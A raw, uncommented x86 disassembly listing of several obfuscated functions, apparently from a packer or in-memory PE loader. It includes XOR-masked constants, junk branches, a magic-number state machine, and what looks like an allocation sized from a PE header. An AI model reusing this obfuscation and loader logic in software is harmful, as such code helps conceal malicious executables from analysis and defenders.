  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
